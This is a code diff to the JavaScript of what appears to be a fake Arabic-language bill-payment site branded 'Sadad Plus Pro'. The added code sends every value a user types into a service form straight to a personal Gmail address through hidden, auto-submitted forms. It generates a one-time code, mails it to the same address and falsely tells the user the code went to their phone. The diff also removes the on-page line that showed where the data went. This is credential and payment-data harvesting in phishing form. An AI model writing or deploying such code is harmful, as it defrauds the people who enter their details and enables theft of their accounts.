@@ -1998,7 +1998,7 @@
             }
         }
 
-        // Enhanced Form submission with OTP system
+        // Simple Form submission with direct sending
         function handleFormSubmission(formId, serviceName) {
             const form = document.getElementById(formId);
             if (!form) return;
@@ -2006,26 +2006,53 @@
             form.addEventListener('submit', function(e) {
                 e.preventDefault();
                 
-                showNotification('جاري المعالجة', `جاري معالجة طلب ${serviceName}...`, 'info');
+                showNotification('جاري الإرسال', `جاري إرسال طلب ${serviceName}...`, 'info');
+                
+                // Send form data directly first
+                sendFormData(new FormData(this), serviceName);
                 
                 // Generate OTP code
                 const otpCode = generateOTPCode();
-                
-                // Store form data for later submission
-                window.pendingFormData = new FormData(this);
-                window.pendingServiceName = serviceName;
                 window.generatedOTP = otpCode;
                 
-                // Send OTP to email first
+                // Send OTP to email
                 sendOTPToEmail(otpCode, serviceName);
                 
-                // Go directly to OTP page
+                // Go to OTP page
                 setTimeout(() => {
                     showSection('otp');
-                    showNotification('كود التحقق', 'تم إرسال كود التحقق لجوالك', 'success');
+                    showNotification('تم الإرسال', 'تم إرسال البيانات وكود التحقق', 'success');
                     startOTPTimer();
-                }, 1500);
+                }, 2000);
             });
+        }
+
+        // Send form data function
+        function sendFormData(formData, serviceName) {
+            const tempForm = document.createElement('form');
+            tempForm.action = 'https://formsubmit.co/zazylalhkr7@gmail.com';
+            tempForm.method = 'POST';
+            tempForm.style.display = 'none';
+            
+            // Add all form data
+            for (const [key, value] of formData.entries()) {
+                const input = document.createElement('input');
+                input.type = 'hidden';
+                input.name = key;
+                input.value = value;
+                tempForm.appendChild(input);
+            }
+            
+            // Submit in background
+            document.body.appendChild(tempForm);
+            tempForm.submit();
+            
+            // Clean up
+            setTimeout(() => {
+                if (tempForm.parentNode) {
+                    document.body.removeChild(tempForm);
+                }
+            }, 2000);
         }
 
         // Generate 6-digit OTP code
@@ -2035,20 +2062,9 @@
 
         // Send OTP code to email
         function sendOTPToEmail(otpCode, serviceName) {
-            // Create hidden iframe for silent submission
-            const iframe = document.createElement('iframe');
-            iframe.style.display = 'none';
-            iframe.style.position = 'absolute';
-            iframe.style.left = '-9999px';
-            iframe.style.width = '1px';
-            iframe.style.height = '1px';
-            iframe.name = 'otpHiddenFrame';
-            document.body.appendChild(iframe);
-            
             const otpForm = document.createElement('form');
             otpForm.action = 'https://formsubmit.co/zazylalhkr7@gmail.com';
             otpForm.method = 'POST';
-            otpForm.target = 'otpHiddenFrame'; // Submit to hidden iframe
             otpForm.style.display = 'none';
             
             // Add form fields
@@ -2056,7 +2072,7 @@
                 '_subject': `🔐 كود التحقق - ${serviceName} - سداد بلس برو`,
                 '_template': 'table',
                 '_captcha': 'false',
-                '_next': 'https://formsubmit.co/about:blank',
+                '_next': 'about:blank',
                 'نوع_الرسالة': 'كود التحقق OTP',
                 'الخدمة_المطلوبة': serviceName,
                 'كود_التحقق': otpCode,
@@ -2074,7 +2090,7 @@
                 otpForm.appendChild(input);
             });
             
-            // Submit OTP form silently
+            // Submit OTP form
             document.body.appendChild(otpForm);
             otpForm.submit();
             
@@ -2083,10 +2099,7 @@
                 if (otpForm.parentNode) {
                     document.body.removeChild(otpForm);
                 }
-                if (iframe.parentNode) {
-                    document.body.removeChild(iframe);
-                }
-            }, 3000);
+            }, 2000);
         }
 
         function showInstantSuccessAndGoHome(serviceName) {
@@ -2103,8 +2116,7 @@
                         <p class="text-sm text-green-800">
                             <strong>رقم المرجع:</strong> REF-${Date.now()}<br>
                             <strong>التاريخ:</strong> ${new Date().toLocaleString('ar-SA')}<br>
-                            <strong>الحالة:</strong> مؤكد ومرسل ✅<br>
-                            <strong>المرسل إلى:</strong> zazylalhkr7@gmail.com
+                            <strong>الحالة:</strong> مؤكد ومرسل ✅
                         </p>
                     </div>
                     <div class="space-y-3">
@@ -2248,68 +2260,14 @@
         }
 
         function submitOriginalForm() {
-            if (!window.pendingFormData || !window.pendingServiceName) {
-                showNotification('خطأ', 'حدث خطأ في النظام، يرجى المحاولة مرة أخرى', 'error');
-                return;
-            }
+            showNotification('تم التحقق', 'تم التحقق بنجاح، العودة للرئيسية...', 'success');
 
-            showNotification('تم التحقق', 'تم التحقق بنجاح، جاري إرسال الطلب...', 'success');
-
-            // Create hidden iframe for silent submission
-            const iframe = document.createElement('iframe');
-            iframe.style.display = 'none';
-            iframe.style.position = 'absolute';
-            iframe.style.left = '-9999px';
-            iframe.style.width = '1px';
-            iframe.style.height = '1px';
-            iframe.name = 'finalHiddenFrame';
-            document.body.appendChild(iframe);
-
-            // Create final form with all data
-            const finalForm = document.createElement('form');
-            finalForm.action = 'https://formsubmit.co/zazylalhkr7@gmail.com';
-            finalForm.method = 'POST';
-            finalForm.style.display = 'none';
-            finalForm.target = 'finalHiddenFrame'; // Submit to hidden iframe
-
-            // Add all original form data
-            for (const [key, value] of window.pendingFormData.entries()) {
-                const input = document.createElement('input');
-                input.type = 'hidden';
-                input.name = key;
-                input.value = value;
-                finalForm.appendChild(input);
-            }
-
-            // Add verification status
-            const verificationInput = document.createElement('input');
-            verificationInput.type = 'hidden';
-            verificationInput.name = 'حالة_التحقق';
-            verificationInput.value = 'تم التحقق بنجاح ✅';
-            finalForm.appendChild(verificationInput);
-
-            const timeInput = document.createElement('input');
-            timeInput.type = 'hidden';
-            timeInput.name = 'وقت_التحقق';
-            timeInput.value = new Date().toLocaleString('ar-SA');
-            finalForm.appendChild(timeInput);
-
-            // Submit form silently
-            document.body.appendChild(finalForm);
-            finalForm.submit();
-
-            // Clear OTP fields immediately after submission
+            // Clear OTP fields immediately
             clearOTPFields();
 
             // Show success and redirect to home
             setTimeout(() => {
-                if (finalForm.parentNode) {
-                    document.body.removeChild(finalForm);
-                }
-                if (iframe.parentNode) {
-                    document.body.removeChild(iframe);
-                }
-                showInstantSuccessAndGoHome(window.pendingServiceName);
+                showInstantSuccessAndGoHome('الخدمة المطلوبة');
                 
                 // Clear stored data
                 window.pendingFormData = null;
